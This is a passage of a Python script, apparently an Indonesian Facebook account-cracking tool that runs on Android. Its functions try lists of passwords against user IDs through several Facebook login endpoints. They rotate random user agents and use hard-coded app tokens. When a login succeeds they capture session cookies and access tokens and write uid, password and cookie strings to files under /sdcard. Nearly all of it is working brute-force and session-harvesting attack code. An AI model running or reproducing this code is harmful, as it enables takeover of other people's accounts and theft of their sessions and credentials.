:'0','locale': 'id_ID','client_country_code': 'ID','fb_api_req_friendly_name':'autheticate','fb_api_caller_class':'Fb4aAuthHandler','api_key':'882a8490361da98702bf97a021ddc14d','access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','sig':'4c854da0db9429f4913c2a1b221c1d30'}
			headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','POST': '/auth/login HTTP/2','Host': 'b-graph.facebook.com','Priority': 'u=3, i','Content-Type': 'application/x-www-form-urlencoded','X-Fb-Sim-Hni': '64301','X-Fb-Net-Hni': '64301','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': ua,'X-Fb-Connection-Quality': 'EXCELLENT','Authorization': 'OAuth 256002347743983%7C374e60f8b9bb6b8cbb30f78030438895','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '6060','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '2126'}
			curl = "https://b-graph.facebook.com/auth/login"
			q = ses.post(curl,data=data, headers=headers, allow_redirects=False,verify=True).json()
			if "session_key" in q:
				ok+=1
				coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
				token = q["access_token"]
				print(f"\r{P}  - {H}{uid}|{pw} -----> OK{P}")
				print(f"\r{P}  - {H}{coki}{token}|{ua}{P}")
				open('/sdcard/ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{coki}|{ua}\n")
				break
			elif 'User must verify their account' in q['error']['message']:
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} -----> CP{P}")
				open('/sdcard/ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(5)
	loop+=1
	
def Reg(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {uid} {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			ua = generate_random_user_agent()
			hget = {'Host': 'free.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			pget = {'next': '','ref': 'dbl','fl': '','login_from_aymh': '1','refid': '8'}
			link = ses.get('https://m.alpha.facebook.com/login/', params=pget, headers=hget)
			data = {'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"', str(link.text)).group(1),'try_number': re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"', str(link.text)).group(1),'email': uid,'pass': pw,'login': 'Masuk','bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
			hpost = {'Host': 'mbasic.facebook.com','content-length': '178','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
			ppost = {'refsrc': 'deprecated','lwv': '100','ref': 'dbl',}
			response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=hpost,headers=ppost,data=data,)
			if "checkpoint" in ses.cookies.get_dict():
				cp+=1
				uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r{P}  - {K}{uid}|{pw} -----> CP{P}")
				open('/sdcard/ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs',coki)[0]
				print(f"\r{P}  - {H}{uid}|{pw} -----> OK{P}")
				print(f"\r{P}  - {H}{coki}|{ua}{P}")
				open('/sdcard/ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{coki}|{ua}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
	
def Val(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\r{P}  - {uid} {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			ua = generate_random_user_agent()
			link = ses.get(f'https://m.alpha.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr')
			data = {'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),'uid': uid,'next': 'https://m.prod.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			headers = {
'Host': 'm.prod.facebook.com',
'content-length': '140',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.prod.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with': 'mark.via.gp',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': f'https://m.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			params = {'shbl': '0'}
			response = ses.post('https://m.prod.facebook.com/login/device-based/validate-password/',data=data,headers=headers,params=params,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r{P}  - {K}{uid}|{pw} -----> CP{P}")
				open('/sdcard/ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
				break
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{P}  - {H}{uid}|{pw} -----> OK{P}")
				print(f"\r{P}  - {H}{coki}|{ua}{P}")
				open('/sdcard/ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{coki}|{ua}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('/sdcard/ESBFLIVE')
	except:pass
	try:os.mkdir('/sdcard/ESBFCHEK')
	except:pass
	menu()